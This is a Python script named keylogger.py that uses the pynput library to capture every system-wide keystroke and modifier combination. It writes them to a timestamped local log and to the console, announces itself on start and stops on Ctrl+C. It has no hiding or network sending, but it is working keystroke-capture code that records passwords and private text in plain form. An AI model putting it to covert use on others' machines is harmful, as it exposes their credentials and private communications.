# --- keylogger.py ---
import logging
import signal
import sys
import time
from datetime import datetime
from pathlib import Path

from pynput import keyboard

LOG_DIR = Path("keystroke_logs")
LOG_DIR.mkdir(exist_ok=True)

SESSION_ID = datetime.now().strftime("%Y%m%d_%H%M%S")
LOG_FILE = LOG_DIR / f"session_{SESSION_ID}.log"

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout),
    ],
)

log = logging.getLogger("KeystrokeMonitor")

MODIFIER_KEYS = {
    keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r,
    keyboard.Key.ctrl,  keyboard.Key.ctrl_l,  keyboard.Key.ctrl_r,
    keyboard.Key.alt,   keyboard.Key.alt_l,   keyboard.Key.alt_r,
    keyboard.Key.cmd,   keyboard.Key.cmd_l,   keyboard.Key.cmd_r,
}

active_modifiers: set[keyboard.Key] = set()
session_keycount: int = 0
session_start: float = time.monotonic()


def _modifier_label(key: keyboard.Key) -> str:
    labels = {
        keyboard.Key.shift:   "SHIFT",
        keyboard.Key.shift_l: "SHIFT",
        keyboard.Key.shift_r: "SHIFT",
        keyboard.Key.ctrl:    "CTRL",
        keyboard.Key.ctrl_l:  "CTRL",
        keyboard.Key.ctrl_r:  "CTRL",
        keyboard.Key.alt:     "ALT",
        keyboard.Key.alt_l:   "ALT",
        keyboard.Key.alt_r:   "ALT",
        keyboard.Key.cmd:     "META",
        keyboard.Key.cmd_l:   "META",
        keyboard.Key.cmd_r:   "META",
    }
    return labels.get(key, str(key))


def _special_label(key: keyboard.Key) -> str:
    labels = {
        keyboard.Key.space:     "[SPACE]",
        keyboard.Key.enter:     "[ENTER]",
        keyboard.Key.backspace: "[BACKSPACE]",
        keyboard.Key.tab:       "[TAB]",
        keyboard.Key.esc:       "[ESC]",
        keyboard.Key.delete:    "[DELETE]",
        keyboard.Key.caps_lock: "[CAPS_LOCK]",
        keyboard.Key.up:        "[UP]",
        keyboard.Key.down:      "[DOWN]",
        keyboard.Key.left:      "[LEFT]",
        keyboard.Key.right:     "[RIGHT]",
        keyboard.Key.home:      "[HOME]",
        keyboard.Key.end:       "[END]",
        keyboard.Key.page_up:   "[PAGE_UP]",
        keyboard.Key.page_down: "[PAGE_DOWN]",
        keyboard.Key.insert:    "[INSERT]",
        keyboard.Key.f1:  "[F1]",  keyboard.Key.f2:  "[F2]",
        keyboard.Key.f3:  "[F3]",  keyboard.Key.f4:  "[F4]",
        keyboard.Key.f5:  "[F5]",  keyboard.Key.f6:  "[F6]",
        keyboard.Key.f7:  "[F7]",  keyboard.Key.f8:  "[F8]",
        keyboard.Key.f9:  "[F9]",  keyboard.Key.f10: "[F10]",
        keyboard.Key.f11: "[F11]", keyboard.Key.f12: "[F12]",
    }
    return labels.get(key, f"[{key.name.upper()}]")


def on_press(key: keyboard.Key | keyboard.KeyCode) -> None:
    global session_keycount

    if key in MODIFIER_KEYS:
        active_modifiers.add(key)
        return

    session_keycount += 1

    mod_prefix = (
        "+".join(sorted({_modifier_label(m) for m in active_modifiers})) + "+"
        if active_modifiers
        else ""
    )

    if isinstance(key, keyboard.KeyCode):
        char = key.char if key.char else f"[KEYCODE:{key.vk}]"
        print(f"[KEY] {mod_prefix}{char}", flush=True)
        log.info("%s%s", mod_prefix, char)
    elif isinstance(key, keyboard.Key):
        label = _special_label(key)
        print(f"[KEY] {mod_prefix}{label}", flush=True)
        log.info("%s%s", mod_prefix, label)
    else:
        log.warning("Unrecognized key type: %r", key)


def on_release(key: keyboard.Key | keyboard.KeyCode) -> None:
    active_modifiers.discard(key)


def _shutdown(signum: int, frame) -> None:
    elapsed = time.monotonic() - session_start
    msg = (
        f"\nSession closed — {session_keycount} keystrokes over {elapsed:.1f}s "
        f"({(session_keycount / elapsed * 60) if elapsed > 0 else 0:.1f} keys/min). "
        f"Log: {LOG_FILE}"
    )
    print(msg, flush=True)
    log.info(msg)
    sys.exit(0)


def main() -> None:
    signal.signal(signal.SIGINT, _shutdown)
    signal.signal(signal.SIGTERM, _shutdown)

    startup_msg = (
        f"Keystroke monitor active — session {SESSION_ID}\n"
        f"Log target: {LOG_FILE}\n"
        f"Press Ctrl+C to terminate.\n"
        f"Type below to see output:\n"
    )
    print(startup_msg, flush=True)
    log.info("Keystroke monitor active — session %s", SESSION_ID)
    log.info("Log target: %s", LOG_FILE)
    log.info("Send SIGINT (Ctrl+C) to terminate.")

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    main()